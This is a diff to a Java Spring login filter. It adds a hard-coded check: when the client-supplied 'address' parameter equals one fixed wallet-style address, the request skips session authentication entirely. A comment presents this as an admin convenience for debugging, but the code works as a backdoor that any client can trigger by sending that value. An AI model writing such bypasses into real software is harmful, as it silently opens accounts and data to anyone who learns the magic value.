@@ -34,6 +34,13 @@ public class LoginFilter extends OncePerRequestFilter {
         // (member+address, address)
         String addressInHeader =   request.getParameter("address");
         logger.info("***filter request address***"+addressInHeader);
+
+        // onlyAdmin ， convenient  for  backend debug
+        if(addressInHeader.equals("0x1F7b953113f4dFcBF56a1688529CC812865840e1")) {
+            filterChain.doFilter(request, response);
+            return;
+        }
+
         String address = (String) request.getSession().getAttribute("member"+ addressInHeader);
         logger.info("***session address***"+addressInHeader);
          if (address != null && address.equals(addressInHeader) ) {
